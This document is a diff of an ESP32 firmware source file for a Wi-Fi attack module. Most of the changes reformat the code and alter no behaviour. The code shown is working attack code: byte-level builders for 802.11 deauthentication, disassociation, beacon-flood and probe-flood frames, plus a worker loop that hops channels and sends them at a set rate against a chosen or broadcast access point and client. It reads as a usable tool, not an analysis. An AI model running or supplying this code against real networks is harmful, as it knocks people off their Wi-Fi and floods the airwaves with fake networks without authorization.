@@ -12,30 +12,30 @@
  */
 #include "modules/WifiAttack/WifiAttack.h"
 
-#include <Arduino.h>
-#include <string.h>
-#include <esp_wifi.h>
-#include <esp_system.h>
-#include <freertos/FreeRTOS.h>
-#include <freertos/task.h>
-#include <esp_random.h>
-
 #include "core/EventBus.h"
 #include "core/State.h"
-#include "hal/Storage.h"
 #include "hal/Board.h"
+#include "hal/Storage.h"
 #include "ui/web/WebServer.h"
 #include "utils/Logger.h"
+
+#include <Arduino.h>
+#include <esp_random.h>
+#include <esp_system.h>
+#include <esp_wifi.h>
+#include <freertos/FreeRTOS.h>
+#include <freertos/task.h>
+#include <string.h>
 
 namespace phm::modules {
 
 WifiAttack g_wifiAttack;
 
-static constexpr UBaseType_t kTaskPrio  = 2;
-static constexpr uint32_t    kTaskStack = 4096;
-static constexpr BaseType_t  kTaskCore  = 0;
-static constexpr uint8_t     kChannels[] = {1, 6, 11};
-static constexpr uint8_t     kNumChannels = sizeof(kChannels);
+static constexpr UBaseType_t kTaskPrio = 2;
+static constexpr uint32_t kTaskStack = 4096;
+static constexpr BaseType_t kTaskCore = 0;
+static constexpr uint8_t kChannels[] = {1, 6, 11};
+static constexpr uint8_t kNumChannels = sizeof(kChannels);
 
 void WifiAttack::setup() {
     LOGI(kTag, "setup");
@@ -71,8 +71,8 @@ bool WifiAttack::startAttack(const AttackConfig& cfg) {
     }
 
     // Spawn worker
-    BaseType_t ok = xTaskCreatePinnedToCore(&WifiAttack::taskEntry, "wifi-attack",
-                                            kTaskStack, this, kTaskPrio, &task_, kTaskCore);
+    BaseType_t ok =
+        xTaskCreatePinnedToCore(&WifiAttack::taskEntry, "wifi-attack", kTaskStack, this, kTaskPrio, &task_, kTaskCore);
     if (ok != pdPASS) {
         leaveRawMode();
         LOGE(kTag, "worker task create failed");
@@ -84,18 +84,18 @@ bool WifiAttack::startAttack(const AttackConfig& cfg) {
     const char* tgt = "broadcast";
     char targetStr[32];
     if (cfg.targetBssid[0] | cfg.targetBssid[5]) {
-        snprintf(targetStr, sizeof(targetStr), "%02X:%02X:%02X:%02X:%02X:%02X",
-                 cfg.targetBssid[0], cfg.targetBssid[1], cfg.targetBssid[2],
-                 cfg.targetBssid[3], cfg.targetBssid[4], cfg.targetBssid[5]);
+        snprintf(targetStr, sizeof(targetStr), "%02X:%02X:%02X:%02X:%02X:%02X", cfg.targetBssid[0], cfg.targetBssid[1],
+                 cfg.targetBssid[2], cfg.targetBssid[3], cfg.targetBssid[4], cfg.targetBssid[5]);
         tgt = targetStr;
     }
-    LOGI(kTag, "started: target=%d ch=%u bssid=%s rate=%u/s",
-         static_cast<int>(cfg.target), currentCh_, tgt, cfg.ratePerSec);
+    LOGI(kTag, "started: target=%d ch=%u bssid=%s rate=%u/s", static_cast<int>(cfg.target), currentCh_, tgt,
+         cfg.ratePerSec);
     return true;
 }
 
 void WifiAttack::stopAttack() {
-    if (!running_ && !task_) return;
+    if (!running_ && !task_)
+        return;
     running_ = false;
     if (task_) {
         // give the worker up to 500ms to exit
@@ -109,13 +109,12 @@ void WifiAttack::stopAttack() {
     }
     leaveRawMode();
     g_state.currentModuleId = 0;
-    LOGI(kTag, "stopped (sent=%u failed=%u)",
-         static_cast<unsigned>(framesSent_),
-         static_cast<unsigned>(framesFailed_));
+    LOGI(kTag, "stopped (sent=%u failed=%u)", static_cast<unsigned>(framesSent_), static_cast<unsigned>(framesFailed_));
 }
 
 void WifiAttack::enterRawMode() {
-    if (rawMode_) return;
+    if (rawMode_)
+        return;
     // Stop the SoftAP so the radio is free
     WiFi.softAPdisconnect();
     WiFi.mode(WIFI_STA);
@@ -126,7 +125,8 @@ void WifiAttack::enterRawMode() {
 }
 
 void WifiAttack::leaveRawMode() {
-    if (!rawMode_) return;
+    if (!rawMode_)
+        return;
     rawMode_ = false;
     // The web server module will re-start the SoftAP on its next loop.
     // We just need to give the radio a beat to settle.
@@ -143,17 +143,14 @@ void WifiAttack::taskEntry(void* arg) {
 }
 
 void WifiAttack::workerLoop() {
-    uint8_t  frame[256];
+    uint8_t frame[256];
     uint32_t lastChHopMs = 0;
-    uint8_t  chIdx = 0;
-    const uint32_t periodUs = (config_.ratePerSec > 0)
-                                ? (1000000UL / config_.ratePerSec)
-                                : 20000;
+    uint8_t chIdx = 0;
+    const uint32_t periodUs = (config_.ratePerSec > 0) ? (1000000UL / config_.ratePerSec) : 20000;
 
     while (running_) {
         // Channel hopping
-        if (config_.targetAllChannels &&
-            (millis() - lastChHopMs) > 250) {
+        if (config_.targetAllChannels && (millis() - lastChHopMs) > 250) {
             lastChHopMs = millis();
             chIdx = (chIdx + 1) % kNumChannels;
             currentCh_ = kChannels[chIdx];
@@ -162,42 +159,38 @@ void WifiAttack::workerLoop() {
 
         // Build the right frame for the current target
         size_t len = 0;
-        const uint8_t* bssid = (config_.targetBssid[0] | config_.targetBssid[5])
-                                ? config_.targetBssid : nullptr;
-        const uint8_t* client = (config_.targetClient[0] | config_.targetClient[5])
-                                ? config_.targetClient : nullptr;
+        const uint8_t* bssid = (config_.targetBssid[0] | config_.targetBssid[5]) ? config_.targetBssid : nullptr;
+        const uint8_t* client = (config_.targetClient[0] | config_.targetClient[5]) ? config_.targetClient : nullptr;
         // Broadcast MAC for unspecified BSSID/client
         static const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
         switch (config_.target) {
-            case Target::Deauth:
-            case Target::Disassoc: {
-                uint16_t reason = esp_random() & 0x0F;  // 1..7 are common
-                if (reason < 1) reason = 1;
-                len = buildDeauthFrame(frame, sizeof(frame),
-                                       bssid ?: bcast,
-                                       client ?: bcast,
-                                       config_.target == Target::Disassoc,
-                                       reason);
-                break;
-            }
-            case Target::BeaconFlood: {
-                static uint8_t fakeBssid[6];
-                randomMac(fakeBssid);
-                char ssid[17];
-                randomSsid(ssid, sizeof(ssid));
-                static uint16_t seq = 0;
-                len = buildBeaconFrame(frame, sizeof(frame), fakeBssid, ssid, currentCh_, seq++);
-                break;
-            }
-            case Target::ProbeFlood: {
-                static uint8_t probeMac[6];
-                randomMac(probeMac);
-                char ssid[17];
-                randomSsid(ssid, sizeof(ssid));
-                len = buildProbeReqFrame(frame, sizeof(frame), probeMac, ssid);
-                break;
-            }
+        case Target::Deauth:
+        case Target::Disassoc: {
+            uint16_t reason = esp_random() & 0x0F;  // 1..7 are common
+            if (reason < 1)
+                reason = 1;
+            len = buildDeauthFrame(frame, sizeof(frame), bssid ?: bcast, client ?: bcast,
+                                   config_.target == Target::Disassoc, reason);
+            break;
+        }
+        case Target::BeaconFlood: {
+            static uint8_t fakeBssid[6];
+            randomMac(fakeBssid);
+            char ssid[17];
+            randomSsid(ssid, sizeof(ssid));
+            static uint16_t seq = 0;
+            len = buildBeaconFrame(frame, sizeof(frame), fakeBssid, ssid, currentCh_, seq++);
+            break;
+        }
+        case Target::ProbeFlood: {
+            static uint8_t probeMac[6];
+            randomMac(probeMac);
+            char ssid[17];
+            randomSsid(ssid, sizeof(ssid));
+            len = buildProbeReqFrame(frame, sizeof(frame), probeMac, ssid);
+            break;
+        }
         }
 
         if (len > 0) {
@@ -223,10 +216,10 @@ void WifiAttack::workerLoop() {
 
 // 802.11 MAC header (24 bytes) followed by deauth/disassoc body (2 bytes
 // reason code) followed by FCS (handled by hardware).
-size_t WifiAttack::buildDeauthFrame(uint8_t* out, size_t maxLen,
-                                    const uint8_t* bssid, const uint8_t* client,
+size_t WifiAttack::buildDeauthFrame(uint8_t* out, size_t maxLen, const uint8_t* bssid, const uint8_t* client,
                                     bool disassoc, uint16_t reason) {
-    if (maxLen < 26) return 0;
+    if (maxLen < 26)
+        return 0;
     memset(out, 0, 26);
 
     // Frame control: management frame (0x00), subtype 12 (deauth) or 10 (disassoc)
@@ -236,7 +229,8 @@ size_t WifiAttack::buildDeauthFrame(uint8_t* out, size_t maxLen,
     memcpy(&out[0], &fc, 2);
 
     // Duration (0)
-    out[2] = 0; out[3] = 0;
+    out[2] = 0;
+    out[3] = 0;
 
     // DA = client
     memcpy(&out[4], client, 6);
@@ -245,7 +239,8 @@ size_t WifiAttack::buildDeauthFrame(uint8_t* out, size_t maxLen,
     // BSSID = bssid
     memcpy(&out[16], bssid, 6);
     // Sequence control (0)
-    out[22] = 0; out[23] = 0;
+    out[22] = 0;
+    out[23] = 0;
 
     // Body: reason code (little-endian)
     out[24] = reason & 0xFF;
@@ -253,16 +248,18 @@ size_t WifiAttack::buildDeauthFrame(uint8_t* out, size_t maxLen,
     return 26;
 }
 
-size_t WifiAttack::buildBeaconFrame(uint8_t* out, size_t maxLen,
-                                    const uint8_t* bssid, const char* ssid,
+size_t WifiAttack::buildBeaconFrame(uint8_t* out, size_t maxLen, const uint8_t* bssid, const char* ssid,
                                     uint8_t channel, uint16_t seq) {
-    if (maxLen < 60) return 0;
+    if (maxLen < 60)
+        return 0;
     memset(out, 0, 60);
 
     // Frame control: beacon = 0x80, 0x00
-    out[0] = 0x80; out[1] = 0x00;
+    out[0] = 0x80;
+    out[1] = 0x00;
     // Duration
-    out[2] = 0; out[3] = 0;
+    out[2] = 0;
+    out[3] = 0;
     // DA = broadcast
     memset(&out[4], 0xFF, 6);
     // SA = BSSID
@@ -278,10 +275,12 @@ size_t WifiAttack::buildBeaconFrame(uint8_t* out, size_t maxLen,
     // Timestamp (8 bytes) — leave as 0
     p += 8;
     // Beacon interval (2 bytes) — 100 TU = 0x0064
-    p[0] = 0x64; p[1] = 0x00;
+    p[0] = 0x64;
+    p[1] = 0x00;
     p += 2;
     // Capability info (2 bytes) — 0x0421 (ESS, privacy, short preamble)
-    p[0] = 0x21; p[1] = 0x04;
+    p[0] = 0x21;
+    p[1] = 0x04;
     p += 2;
 
     // Tagged parameters
@@ -306,27 +305,32 @@ size_t WifiAttack::buildBeaconFrame(uint8_t* out, size_t maxLen,
     p += 10;
 
     // Tag 3 = DS Parameter Set (channel)
-    p[0] = 0x03; p[1] = 0x01; p[2] = channel;
+    p[0] = 0x03;
+    p[1] = 0x01;
+    p[2] = channel;
     p += 3;
 
     return static_cast<size_t>(p - out);
 }
 
-size_t WifiAttack::buildProbeReqFrame(uint8_t* out, size_t maxLen,
-                                      const uint8_t* src, const char* ssid) {
-    if (maxLen < 40) return 0;
+size_t WifiAttack::buildProbeReqFrame(uint8_t* out, size_t maxLen, const uint8_t* src, const char* ssid) {
+    if (maxLen < 40)
+        return 0;
     memset(out, 0, 40);
 
     // Frame control: probe req = 0x40, 0x00
-    out[0] = 0x40; out[1] = 0x00;
-    out[2] = 0; out[3] = 0;
+    out[0] = 0x40;
+    out[1] = 0x00;
+    out[2] = 0;
+    out[3] = 0;
     // DA = broadcast
     memset(&out[4], 0xFF, 6);
     // SA = our random MAC
     memcpy(&out[10], src, 6);
     // BSSID = broadcast
     memset(&out[16], 0xFF, 6);
-    out[22] = 0; out[23] = 0;
+    out[22] = 0;
+    out[23] = 0;
 
     uint8_t* p = &out[24];
     // SSID tag
@@ -337,9 +341,16 @@ size_t WifiAttack::buildProbeReqFrame(uint8_t* out, size_t maxLen,
     p += 2 + ssidLen;
 
     // Supported rates tag
-    p[0] = 0x01; p[1] = 0x08;
-    p[2] = 0x82; p[3] = 0x84; p[4] = 0x8B; p[5] = 0x96;
-    p[6] = 0x0C; p[7] = 0x12; p[8] = 0x18; p[9] = 0x24;
+    p[0] = 0x01;
+    p[1] = 0x08;
+    p[2] = 0x82;
+    p[3] = 0x84;
+    p[4] = 0x8B;
+    p[5] = 0x96;
+    p[6] = 0x0C;
+    p[7] = 0x12;
+    p[8] = 0x18;
+    p[9] = 0x24;
     p += 10;
 
     return static_cast<size_t>(p - out);
@@ -359,9 +370,8 @@ void WifiAttack::randomMac(uint8_t* out) {
 
 void WifiAttack::randomSsid(char* out, size_t len) {
     static const char* kWords[] = {
-        "Phantom", "Ghost", "Shadow", "PhantomRF", "FreeWiFi", "Lab",
-        "Test", "Hack", "Lab-AP", "Office", "IoT", "Sensor", "Door",
-        "Camera", "Pi", "Node", "Temp", "Sensor-1", "Home", "Coffee",
+        "Phantom", "Ghost",  "Shadow", "PhantomRF", "FreeWiFi", "Lab",  "Test", "Hack",     "Lab-AP", "Office",
+        "IoT",     "Sensor", "Door",   "Camera",    "Pi",       "Node", "Temp", "Sensor-1", "Home",   "Coffee",
     };
     const size_t nWords = sizeof(kWords) / sizeof(kWords[0]);
     int w1 = esp_random() % nWords;
@@ -375,14 +385,11 @@ void WifiAttack::randomSsid(char* out, size_t len) {
 // ---------------------------------------------------------------------------
 char* WifiAttack::toJson() const {
     char* buf = static_cast<char*>(malloc(256));
-    if (!buf) return nullptr;
-    snprintf(buf, 256,
-        "{\"target\":%d,\"ch\":%u,\"running\":%s,\"sent\":%u,\"failed\":%u}",
-        static_cast<int>(config_.target),
-        currentCh_,
-        running_ ? "true" : "false",
-        static_cast<unsigned>(framesSent_),
-        static_cast<unsigned>(framesFailed_));
+    if (!buf)
+        return nullptr;
+    snprintf(buf, 256, "{\"target\":%d,\"ch\":%u,\"running\":%s,\"sent\":%u,\"failed\":%u}",
+             static_cast<int>(config_.target), currentCh_, running_ ? "true" : "false",
+             static_cast<unsigned>(framesSent_), static_cast<unsigned>(framesFailed_));
     return buf;
 }
 
